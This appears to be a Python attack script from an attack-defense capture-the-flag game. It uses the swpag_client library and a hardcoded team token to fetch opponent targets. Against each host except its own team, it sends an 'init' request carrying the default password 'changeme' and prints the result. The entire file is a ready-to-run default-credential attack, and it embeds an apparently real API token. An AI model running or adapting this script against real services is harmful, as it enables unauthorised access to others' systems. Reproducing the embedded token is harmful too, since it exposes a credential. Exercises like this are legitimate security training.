import swpag_client
import re
import random
import requests

def run(target):
  hostname = target['hostname']
  port = int(target['port'])
  flag_id = target['flag_id']
  url = "http://{0}:{1}/init?password=changeme".format(
    hostname, port)
  r = requests.get(url = url)
  print(hostname + ': ' + r.text)

team = swpag_client.Team('http://52.37.204.0/', 'nt4yw7LjoPFc2WE49cLG')

targets = team.get_targets(3)

for target in targets:
  if target['hostname'] == 'team12': # own flag
    continue
  else:
    run(target)
    # try:
    #   run(target)
    # except:
    #   pass